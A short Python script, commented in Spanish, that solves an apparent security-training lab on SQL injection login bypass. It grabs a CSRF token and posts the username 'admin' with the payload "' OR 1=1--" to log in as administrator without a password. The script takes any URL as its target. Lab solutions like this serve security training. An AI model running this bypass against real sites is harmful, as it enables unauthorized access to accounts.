# Lab: SQL injection vulnerability allowing login bypass
# APPRENTICE

# This lab contains a SQL injection vulnerability in the login function.
# To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

#Elimina el mensaje que que https no tiene certificado 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
Ruta = "/login"
Payload = "' OR 1=1--"

def Obtener_Token_CSRF(Session,Url):
    SolicitudWeb = Session.get(Url + Ruta, verify=False, proxies=proxies )
    Parseando = BeautifulSoup(SolicitudWeb.content, 'html.parser')
    TokenCSRF = Parseando.find("input")['value']
    return TokenCSRF

def Sqli_Lab_02(Url,Session):
    Token = Obtener_Token_CSRF(Session,Url)
    ParametrosPost = {"csrf": Token,
                      "username":"admin"+Payload,
                      "password":"caulquiercosa"
    }
    EnvioDatosPost = Session.post(Url + Ruta, data=ParametrosPost, verify=False, proxies=proxies)
    RespuestaServidor = EnvioDatosPost.text
    if "Log out" in RespuestaServidor:
        print(f'[+] SQLi Bypass Inicio de sessión exitoso, Payload:{Payload}')
    else:
        print('[+] SQLi Bypass Inicio de sessión fallido')

if __name__ == "__main__":
    try:
        Url = sys.argv[1].strip()
        S = requests.Session()
        Sqli_Lab_02(Url,S)
    except:
        print('[-] Uso: %s <url> ' % sys.argv[0])
        print('[-] Ejemplo: %s www.ejemplo.com ' % sys.argv[0])

    

